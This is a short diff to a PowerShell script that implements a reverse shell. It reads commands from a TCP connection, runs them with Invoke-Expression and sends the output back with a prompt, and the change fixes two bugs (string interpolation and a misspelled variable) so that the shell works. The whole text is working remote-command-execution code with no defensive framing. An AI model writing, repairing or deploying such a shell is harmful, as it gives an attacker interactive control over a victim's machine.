@@ -6,14 +6,14 @@ $writer = New-Object System.IO.StreamWriter($stream)
 $writer.AutoFlush = $true
 $buffer = New-Object byte[] 1024
 $encoding = New-Object System.Text.ASCIIEncoding
-$writer.WriteLine("Connected to $ip:$port")
+$writer.WriteLine("Connected to ${ip}:${port}")
 try {
     while ($stream.CanRead -and ($client.Connected -eq $true)) {
         $bytesRead = $stream.Read($buffer, 0, $buffer.Length)
         if ($bytesRead -le 0) {
             break  # Exit the loop if no data is read, indicating the connection is closed
         }
-        $data = $encoding.GetString($buffer, 0, $ytesRead)
+        $data = $encoding.GetString($buffer, 0, $bytesRead)
         $sendback = (Invoke-Expression -Command $data 2>&1 | Out-String )
         $sendback2  = $sendback + "PS " + (pwd).Path + "> "
         $sendbackBytes = $encoding.GetBytes($sendback2)
